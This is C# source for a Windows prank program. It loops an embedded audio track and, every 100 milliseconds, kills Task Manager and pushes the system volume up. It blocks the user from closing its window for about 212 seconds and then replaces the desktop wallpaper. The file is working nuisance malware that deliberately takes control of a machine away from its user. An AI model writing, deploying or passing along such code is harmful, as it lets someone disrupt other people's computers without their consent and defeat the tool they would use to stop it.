using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Test.Properties;

namespace Test
{
    public partial class Form1 : Form
    {
        private System.Timers.Timer timer;
        private System.Media.SoundPlayer player = new SoundPlayer();
        private int timeElapsed = 0;
        public Form1()
        {
            player.Stream = Test.Properties.Resources.rick;
            player.PlayLooping();
            timer = new System.Timers.Timer(100);
            timer.Elapsed += OnTimerOnElapsed;
            timer.Start();
            InitializeComponent();
            
            this.Closing += OnClosing;

        }
        

        private void OnTimerOnElapsed(object sender, ElapsedEventArgs args)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => OnTimerOnElapsed(sender, args)));
            }
            else
            {
                KillTaskManager();
                //for (int i = 0; i < 50; i++)
                //{
                    VolUp();
                //}
                timeElapsed += 100;
            }
        }

        private void OnClosing(object sender, CancelEventArgs cancelEventArgs)
        {
            if (timeElapsed > 1000*212)
            {
                Wallpaper.Set(Test.Properties.Resources.gay_unicorn, Wallpaper.Style.Centered);
                return;
            }
            cancelEventArgs.Cancel = true;
            MessageBox.Show(this, "Nope", "LOL", MessageBoxButtons.OK, MessageBoxIcon.Stop);
        }


        private const int APPCOMMAND_VOLUME_MUTE = 0x80000;
        private const int APPCOMMAND_VOLUME_UP = 0xA0000;
        private const int APPCOMMAND_VOLUME_DOWN = 0x90000;
        private const int WM_APPCOMMAND = 0x319;

        [DllImport("user32.dll")]
        public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg,
            IntPtr wParam, IntPtr lParam);

        private void Mute()
        {
            SendMessageW(this.Handle, WM_APPCOMMAND, this.Handle,
                (IntPtr)APPCOMMAND_VOLUME_MUTE);
        }

        private void VolDown()
        {
            SendMessageW(this.Handle, WM_APPCOMMAND, this.Handle,
                (IntPtr)APPCOMMAND_VOLUME_DOWN);
        }

        private void VolUp()
        {
            SendMessageW(this.Handle, WM_APPCOMMAND, this.Handle,
                (IntPtr)APPCOMMAND_VOLUME_UP);
        }

        private void KillTaskManager()
        {
            var process = Process.GetProcesses().SingleOrDefault(p => p.ProcessName.Equals("Taskmgr"));
            try
            {
                process?.Kill();
            }
            catch (Exception)
            {
                try
                {
                    process?.Close();
                }
                catch (Exception)
                {
                    // ignored
                }
            }
        }
    }
}
